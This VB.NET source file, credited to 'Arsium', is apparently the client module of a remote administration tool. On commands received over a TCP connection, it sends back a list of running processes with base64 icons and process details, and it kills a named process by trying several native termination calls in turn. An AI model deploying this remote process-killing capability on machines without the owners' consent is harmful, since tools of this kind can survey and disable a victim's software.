Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Windows.Forms
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class MainCL
    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
        Dim h As String() = Split(l, "|SP2|")

        If h(1) = "|GETTASKS|" Then

            Await Task.Run(Sub() TasksGot(k))


        ElseIf h(1) = "|GETTASKSNOTOLD|" Then

            Await Task.Run(Sub() TasksGot(k, "|OLD|"))

        ElseIf h(1) = "|CLOSETHAT|" Then

            Await Task.Run(Sub() CloseAFCKP(k, h(2)))


        ElseIf h(1) = "|INFO|" Then
            Await Task.Run(Sub() GetIinfo(h(2), k))
        End If
    End Sub

    Public Shared Async Sub GetIinfo(ByVal lp As String, ByVal K As TcpClient)
        Dim o As New StringBuilder
        Dim jk As Process() = Process.GetProcesses
        For Each h In jk
            If h.ProcessName = lp Then

                Try
                    o.Append(h.Handle.ToString & "|/\|")
                Catch ex As Exception
                    o.Append("Do not have permission to retrieve the natif handle" & "|/\|")
                End Try

                Try


                    o.Append(h.Modules(0).FileName & "|/\|")
                Catch ex As Exception
                    o.Append("Do not have permission to retrieve the path" & "|/\|")
                End Try

                Try
                    o.Append(h.Id & "|/\|")
                Catch ex As Exception
                    o.Append("Cannot retrieve this process ID" & "|/\|")
                End Try


                Try
                    o.Append(h.MainModule.BaseAddress.ToString & "|/\|")
                Catch ex As Exception
                    o.Append("Cannot retrieve this process address" & "|/\|")
                End Try


                Try
                    o.Append(h.BasePriority & "|/\|")
                Catch ex As Exception
                    o.Append("Cannot retrieve this process priority" & "|/\|")
                End Try


                Try
                    o.Append(h.MainWindowHandle.ToString & "|/\|")
                Catch ex As Exception
                    o.Append("Cannot retrieve this process main window handle" & "|/\|")
                End Try




                Try
                    o.Append(h.MainWindowTitle.ToString & "|/\|")
                Catch ex As Exception
                    o.Append("Cannot retrieve this process main window title" & "|/\|")
                End Try


                Try
                    o.Append(lp & "|/\|")
                Catch ex As Exception

                End Try

            End If


        Next

        o.Append(lp & "|ENDPROCINFO|")


        Dim Send As String = o.ToString

        Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(Send)


        Await K.GetStream.WriteAsync(buffer, 0, buffer.Length)


    End Sub














    Public Shared Async Sub TasksGot(ByVal k As TcpClient, Optional ByVal Helper As String = "")
        Dim ListView1 As New ListView
        Dim Ultitask As New StringBuilder



        Dim jk As Process() = Process.GetProcesses

        ListView1.Sorting = SortOrder.Descending

        For Each h In jk


            Try
                If File.Exists(h.MainModule.FileName) Then




                    Dim i As System.Drawing.Icon = System.Drawing.Icon.ExtractAssociatedIcon(h.MainModule.FileName)



                    Dim stream As MemoryStream = New MemoryStream()
                    Dim azo As Bitmap = i.ToBitmap

                    azo.Save(stream, ImageFormat.Png)




                    Dim o As String = Convert.ToBase64String(stream.ToArray())

                    Ultitask.AppendLine(h.ProcessName & "|IC|" & o)


                End If

            Catch ex As Exception
                Ultitask.AppendLine(h.ProcessName & "|IC|")
            End Try
            ' & "|IC|" & o) '& "////" & h.SubItems(1).Text & "////" & h.SubItems(2).Text) ' & "////" & h.SubItems(3).Text)



            GC.Collect()
            GC.WaitForPendingFinalizers()

        Next


        GC.Collect()
        GC.WaitForPendingFinalizers()


        Dim Send As String = Ultitask.ToString & "|TASKF|" & Helper

        Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(Send)


        Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)


    End Sub



    Public Shared Async Sub CloseAFCKP(ByVal k As TcpClient, ByVal p As String)


        Dim result
        Dim jk As Process() = Process.GetProcesses


        For Each ah In jk

            If ah.ProcessName = p Then
                Try
                    result = ProcessEnding.NtTerminateProcess(ah.Handle)
                    If Not result = 0 Then
                        Dim R As String = result & "|/\|" & p & "|RK|"
                        Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(R)



                        Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)

                        Exit For
                    End If
                Catch ex As Exception



                End Try

                Try

                    result = ProcessEnding.ZwTerminateProcess(ah.Handle)

                    If Not result = 0 Then
                        Dim R As String = result & "|/\|" & p & "|RK|"
                        Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(R)



                        Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
                        Exit For
                    End If

                Catch ex As Exception

                End Try




                Try

                    result = ProcessEnding.EndTask(ah.MainWindowHandle, True, True)

                    If Not result = 0 Then
                        Dim R As String = result & "|/\|" & p & "|RK|"
                        Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(R)



                        Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
                        Exit For
                    End If
                Catch ex As Exception

                End Try



                Try

                    result = ProcessEnding.TerminateProcess(ah.Handle, 0)
                    If Not result = 0 Then
                        Dim R As String = result & "|/\|" & p & "|RK|"
                        Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(R)


                        Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
                        Exit For




                    End If
                Catch ex As Exception

                End Try

            End If


        Next


        If result = 0 Then
            Dim R As String = result & "|/\|" & p & "|RK|"

            Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(R)


            Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
        End If


    End Sub








    <DllImport("user32.dll")>
    Public Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As WM_Message, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function



    Public Enum WM_Message As UInteger

        WM_CREATE = &H1
        WM_DESTROY = &H2

        WM_MOVE = &H3
        WM_SIZE = &H5

        ''' <summary>
        ''' wParam : Indicates whether the window has been enabled Or disabled. This parameter Is True If the window has been enabled Or False If the window has been disabled.
        ''' </summary>
        WM_ENABLE = &HA



        ''' <summary>
        ''' This can't be sent with PostMessage 
        ''' wParam
        '''   This parameter Is Not used.
        '''    lParam
        '''   A pointer To a null-terminated String that Is the window text.
        '''   Must be used like : 
        ''' Dim Txt As IntPtr = Marshal.StringToHGlobalAnsi("YourText)
        '''
        '''     NativeFunctions.Win32.User32.SendMessage(Me.Handle, NativeFunctions.Win32.User32.WM_Message.WM_SETTEXT, 0, Txt)
        ''' </summary>
        WM_SETTEXT = &HC


        WM_PAINT = &HF

        WM_CLOSE = &H10

        ''' <summary>
        ''' Erase Background
        ''' </summary>
        WM_ERASEBKGD = &H14


        WM_QUIT = &H12

        WM_NCDESTROY = &H82

        WM_NCCREATE = &H81

        ''' <summary>
        ''' Refer to https://docs.microsoft.com/en-us/windows/win32/controls/wm-hscroll
        ''' </summary>
        WM_HSCROLL = &H114

        ''' <summary>
        ''' Refer to https://docs.microsoft.com/en-us/windows/win32/controls/wm-vscroll
        ''' </summary>
        WM_VSCROLL = &H115


        ''' <summary>
        ''' wParam : 
        '''
        '''  The virtual-key code Of the key being pressed. See Virtual-Key Codes.
        '''
        '''lParam : 
        ''' The repeat count, scan code, extended-key flag, context code, previous key-state flag, And transition-state flag, As shown In the following table.
        ''' Refer to  : https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-keydown
        ''' </summary>
        ''' 
        WM_KEYDOWN = &H100

        ''' <summary>
        ''' wParam : 
        '''
        '''  The virtual-key code Of the key being pressed. See Virtual-Key Codes.
        '''
        '''lParam : 
        ''' The repeat count, scan code, extended-key flag, context code, previous key-state flag, And transition-state flag, As shown In the following table.
        ''' Refer to  : https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-syskeydown
        ''' </summary>
        WM_SYSKEYDOWN = &H104


        ''' <summary>
        ''' Parameters
        '''     wParam : 
        '''
        '''    The virtual-key code Of the nonsystem key. See Virtual-Key Codes.
        '''     lParam : 
        '''
        '''    The repeat count, scan code, extended-key flag, context code, previous key-state flag, And transition-state flag, As shown In the following table.
        '''    Refer to : https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-keyup
        ''' </summary>

        WM_KEYUP = &H101

        ''' <summary>
        ''' Parameters
        '''     wParam : 
        '''
        '''    The virtual-key code Of the nonsystem key. See Virtual-Key Codes.
        '''     lParam : 
        '''
        '''    The repeat count, scan code, extended-key flag, context code, previous key-state flag, And transition-state flag, As shown In the following table.
        '''    Refer to https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-syskeyup
        ''' </summary>
        WM_SYSKEYUP = &H105






        ''' <summary>
        ''' Refer to  : https://docs.microsoft.com/en-us/windows/win32/menurc/wm-command
        ''' </summary>
        WM_COMMAND = &H111














        ''' <summary>
        ''' wParam : 
        '''         The type Of system command requested. This parameter can be one Of the following values.
        '''SC_CLOSE : 0xF060 :  Closes the window.
        '''
        '''SC_CONTEXTHELP : 0xF180 : Changes the cursor To a question mark With a pointer. If the user Then clicks a control In the dialog box, the control receives a WM_HELP message.
        '''  
        '''SC_DEFAULT : 0xF160 : Selects the Default item; the user Double-clicked the window menu.
        '''
        '''SC_HOTKEY : 0xF150 : Activates the window associated With the application-specified hot key. The lParam parameter identifies the window To activate.
        '''
        '''SC_HSCROLL  : 0xF080 : Scrolls horizontally.
        '''
        '''SCF_ISSECURE : 0x00000001 : Indicates whether the screen saver Is secure.
        '''
        '''SC_KEYMENU : 0xF100 : Retrieves the window menu As a result Of a keystroke. For more information, see the Remarks section.
        '''
        '''SC_MAXIMIZE : 0xF030 : Maximizes the window.
        '''
        '''SC_MINIMIZE : 0xF020 : Minimizes the window.
        '''
        '''SC_MONITORPOWER : 0xF170 : Sets the state Of the display. This command supports devices that have power-saving features, such As a battery-powered personal computer.
        '''The lParam parameter can have the following values:
        '''
        '''-1 (the display Is powering on)
        '''1 (the display Is going to low power)
        '''2 (the display Is being shut off)
        '''
        '''SC_MOUSEMENU : 0xF090: Retrieves the window menu As a result Of a mouse click.
        '''
        '''SC_MOVE : 0xF010 : Moves the window.
        '''
        '''SC_NEXTWINDOW :0xF040 : Moves To the Next window.
        '''
        '''SC_PREVWINDOW : 0xF050 : Moves To the previous window.
        '''
        '''SC_RESTORE : 0xF120 : Restores the window To its normal position And size.
        '''
        '''SC_SCREENSAVE : 0xF140 : Executes the screen saver application specified In the [boot] section Of the System.ini file.
        '''
        '''SC_SIZE : 0xF000 / Sizes the window.
        '''
        '''SC_TASKLIST : 0xF130 : Activates the Start menu. :        NativeFunctions.Win32.User32.PostMessage(Me.Handle, NativeFunctions.Win32.User32.WM_Message.WM_SYSCOMMAND, New IntPtr(&HF130), False)
        '''
        '''SC_VSCROLL : 0xF070 : Scrolls vertically.
        '''
        ''' </summary>
        WM_SYSCOMMAND = &H112


    End Enum



    Public Class ProcessEnding

        <DllImport("ntdll.dll")>
        Public Shared Function NtTerminateProcess(ByVal ProcHandle As IntPtr, Optional ByVal ErrorStatus As Integer = 0) As UInteger
        End Function


        <DllImport("ntdll.dll")>
        Public Shared Function ZwTerminateProcess(ByVal ProcHandle As IntPtr, Optional ByVal ErrorStatus As Integer = 0) As UInteger
        End Function

        <DllImport("user32.dll")>
        Public Shared Function EndTask(ByVal handle As IntPtr, ByVal n As Boolean, ByVal j As Boolean) As Boolean

        End Function

        <DllImport("kernel32.dll")>
        Public Shared Function TerminateProcess(ByVal Handle As IntPtr, ByVal uExitCoed As UInteger) As Boolean

        End Function



        <DllImport("ntdll.dll")>
        Public Shared Function NtSuspendProcess(ByVal ProcHandle As IntPtr) As UInteger
        End Function


        <DllImport("ntdll.dll")>
        Public Shared Function ZwSuspendProcess(ByVal ProcHandle As IntPtr) As UInteger
        End Function


        <DllImport("ntdll.dll")>
        Public Shared Function NtResumeProcess(ByVal ProcessHandle As IntPtr) As IntPtr
        End Function

        <DllImport("ntdll.dll")>
        Public Shared Function ZwResumeProcess(ByVal ProcessHandle As IntPtr) As IntPtr
        End Function

    End Class

End Class
